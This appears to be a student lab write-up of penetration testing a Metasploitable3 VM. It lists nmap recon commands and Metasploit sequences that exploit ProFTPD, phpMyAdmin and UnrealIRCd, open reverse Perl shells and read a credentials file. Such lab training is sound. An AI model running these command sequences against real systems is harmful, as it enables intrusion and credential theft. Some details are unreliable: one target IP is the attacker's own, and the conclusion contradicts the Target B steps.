# Ethical Hacking & Pen-Testing

## Overview:

The goal for this lab is to gain hands-on experience in penetration testing using Kali Linux, Metasploit, and Nmap. Furthermore, Tools that were used to achieve this goal are Kali Linux with `nmap` and Metasploit, and Metasploitable3 which is the target machine. There are 2 Parts to this lab: Recon, and exploiting ProFTPD with Metasploitable3, exploiting Jetty/PhpMyAdmin and lastly, exploiting IRC/MySQL.

## Part 1. Recon:

Note:

Metasploitable3 IP Address: 192.168.0.102 (the target machine’s IP address)

Kali IP Address: 192.168.0.100

**Commands Used:**

`nmap` -A 192.168.0.102

`nmap` -O 192.168.0.102

`nmap` –-osscan-guess 192.168.0.102

`nmap` -sV -sC 192.168.0.102

## Part 2. Metasploit:

### Target A: ProFTPD

**Commands Used:**

systemctl start postgresql

msfdb init

`msfconsole`

`search` proftpd

`use` `exploit`/unix/ftp/proftpd_modcopy_exec

`show` options

`set` `RHOSTS` 192.168.0.100

`set` `SITEPATH` /var/www/html

`set` `RPORT_FTP` 21

`set` `LHOST` 192.168.0.100

`show` payloads

`set` `PAYLOAD` cmd/unix/reverse_perl

`exploit`

`whoami`

`ls` -l

`shell`

`cat` /var/www/html/phpmyadmin/config.inc.php

`exit`

### Target B: PhpMyAdmin

**Commands Used:**

Note:  I had to go into the phpMyAdmin to check the credential in figure 2.2 to help with exploiting phpMyAdmin since proftpd had phpMyAdmin in the session.

That is, `use` the command in the `shell` to get the password to phpmyadmin:

`cat` /var/www/html/phpmyadmin/config.inc.php

**Commands Used:**

`search` phpmyadmin

`use` `exploit`/multi/http/phpMyAdmin_preg_replace

`show` options

`set` `RHOSTS` 192.168.0.102

`set` `RPORT` 80

`set` PATH /phpmyadmin

`set` USERNAME root

`set` PASSWORD sploitme

`exploit`

`ls`

`shell`

`whoami`

`exit`

### Target C: IRC

**Commands Used:**

Note:  IRC with port 6697 – port 6697 is open to `exploit` whereas port 6667 is filtered

**Commands Used:**

`nmap` -sV -p 6697 192.168.0.102

`msfconsole`

`search` irc

`use` unix/irc/unreal_ircd_3281_backdoor

`show` options

`show` payloads

`set` `RPORT` 6697

`set` `RHOSTS` 192.168.0.102

`set` payload cmd/unix/reverse_perl

`set` `LHOST` 192.168.0.100

`set` `LPORT` 4444

`exploit`

`whoami`

`uname` -a

`pwd`

`ls` -la

`exit`

# Conclusion:

In conclusion, for Target A, the ProFTPD server was exploited using Metasploit, providing root `shell` access to the vulnerable service. Although Target B at first appeared challenging since Jetty itself was not vulnerable and PhpMyAdmin required credentials, I moved on by focusing on exploiting the Continuum application hosted under the Jetty server, which was successful. For Target C, while the IRC service on port 6667 was filtered and infeasible to `exploit`, I found an alternative approach via port 6697 which was a successful exploitation of the IRC server. These experiences and challenges helped me further understand how penetration testing works.
